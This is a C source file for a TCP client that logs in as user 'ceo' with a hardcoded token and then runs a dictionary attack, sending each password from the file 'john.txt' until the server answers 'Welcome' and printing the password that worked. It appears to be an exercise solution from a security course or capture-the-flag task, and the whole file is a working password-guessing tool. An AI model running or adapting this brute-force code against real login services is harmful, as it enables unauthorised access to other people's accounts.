#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <errno.h>
#include <string.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <sys/socket.h>
#include <arpa/inet.h>

#define MAXDATASIZE 1024

void readline(int fd, char* line, int max);

int main(int argc, char *argv[])
{
  // Read hostname and port from the command-line
  if (argc < 2) {
      printf("Usage: ./client <ip-address> <port-number>\n");
      return(1);
    }

  int sockfd;
  struct sockaddr_in server;

  memset(&server, 0, sizeof(server));
  server.sin_family = AF_INET;
  server.sin_addr.s_addr = inet_addr(argv[1]);
  server.sin_port = htons(atoi(argv[2]));

  // Open socket
  if ((sockfd = socket(AF_INET, SOCK_STREAM, 0)) < 0) {
    perror("server: socket error");
    return(1);
  }

  // Connect to the server
  if (connect(sockfd, (struct sockaddr *)&server, sizeof(struct sockaddr)) < 0) {
    close(sockfd);
    perror("client: connect error");
    return(1);
  }

  char request[MAXDATASIZE+1];
  char reply[MAXDATASIZE+1];

  // char *username = "ceo\r\n";
  char *token = "4bc4bc7ee2f879af\r\n";

  // Write to the socket
  sprintf(request,"LOGIN ceo\r\n");
  write(sockfd, request, strlen(request));

  sprintf(request, "%s", token);
  write(sockfd, request, strlen(request));

  readline(sockfd, reply, MAXDATASIZE);
  puts(reply);
  readline(sockfd, reply, MAXDATASIZE);
  puts(reply);
  readline(sockfd, reply, MAXDATASIZE);
  puts(reply);
  readline(sockfd, reply, MAXDATASIZE);
  puts(reply);
  readline(sockfd, reply, MAXDATASIZE); // Please enter password
  puts(reply);


  // sprintf(request,"onemorething\r\n");
  // write(sockfd, request, strlen(request3));

  // char *token = "947934b5c30c7bd4";
  char *filename = "john.txt";

  FILE *dict;
  if ((dict = fopen(filename, "r")) < 0) {
    printf("Could not open dictionary file.\n");
      exit(0);
  }

  char *pass;
  size_t len = 0;
  while (getline(&pass, &len, dict) != -1) {
    // try password
    //puts(pass);
    write(sockfd, pass, strlen(pass));
    readline(sockfd, reply, MAXDATASIZE); // EITHER incorrect password OR welcome
    //puts(reply);
    //readline(sockfd, reply, MAXDATASIZE); //Please enter password
    //puts(reply);
    if (strstr(reply, "Welcome") != NULL) {
     // puts("HEREEEEEE");
      puts(pass);
      readline(sockfd, reply, MAXDATASIZE);
      puts(reply);
      fclose(dict);
      break;
    }
    readline(sockfd, reply, MAXDATASIZE);
  }

  // Read one line from the server and print
  
  readline(sockfd, reply, MAXDATASIZE);
  puts(reply);
  readline(sockfd, reply, MAXDATASIZE);
  puts(reply);
  readline(sockfd, reply, MAXDATASIZE);
  puts(reply);


  close(sockfd);
  return(0);
}

// Read one line from fd
void readline(int fd, char* line, int max) {
  char ch;
  int i;
  for (i = 0; i < max; i++) {
    if (read(fd,&ch,1) < 1) break;
    if (ch == '\0') break;
    line[i] = ch;
    if (ch == '\n') break;
  }
  line[i] = '\0';
}